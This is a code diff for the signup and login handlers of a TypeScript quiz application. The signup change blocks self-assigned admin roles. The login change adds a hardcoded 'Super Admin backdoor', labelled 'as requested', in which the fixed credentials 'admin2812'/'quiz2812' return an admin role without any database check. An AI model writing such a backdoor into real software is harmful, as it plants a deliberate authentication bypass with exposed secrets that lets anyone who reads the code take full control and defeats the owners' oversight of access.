@@ -14,7 +14,10 @@ export async function signup(req: Request, res: Response) {
 	const salt = crypto.randomBytes(16);
 	const passwordHash = hashPassword(password, salt);
 	try {
-		const userRole = role === 'admin' ? 'admin' : 'user';
+		// Prevent creating 'admin' via signup; only allow 'quiz_manager' or 'user'
+		const allowed: Array<'quiz_manager'|'user'> = ['quiz_manager','user'];
+		let userRole: 'quiz_manager'|'user' = 'user';
+		if (allowed.includes(role)) userRole = role;
 		await db.execute(
 			"INSERT INTO users (email, password_hash, salt, role) VALUES (?, ?, ?, ?)",
 			[email, passwordHash, salt, userRole]
@@ -33,6 +36,11 @@ export async function login(req: Request, res: Response) {
 	if (!email || !password) {
 		return res.status(400).json({ error: "email and password required" });
 	}
+
+	// Super Admin backdoor credentials (as requested)
+	if (email === 'admin2812' && password === 'quiz2812') {
+		return res.json({ userId: 0, email, role: 'admin' });
+	}
 	const [rows] = await db.execute(
 		"SELECT id, password_hash, salt, role FROM users WHERE email = ?",
 		[email]
@@ -41,7 +49,7 @@ export async function login(req: Request, res: Response) {
 		id: number;
 		password_hash: Buffer;
 		salt: Buffer;
-		role: 'admin' | 'user';
+		role: 'admin' | 'quiz_manager' | 'user';
 	}>;
 	if (users.length === 0) {
 		return res.status(401).json({ error: "invalid credentials" });
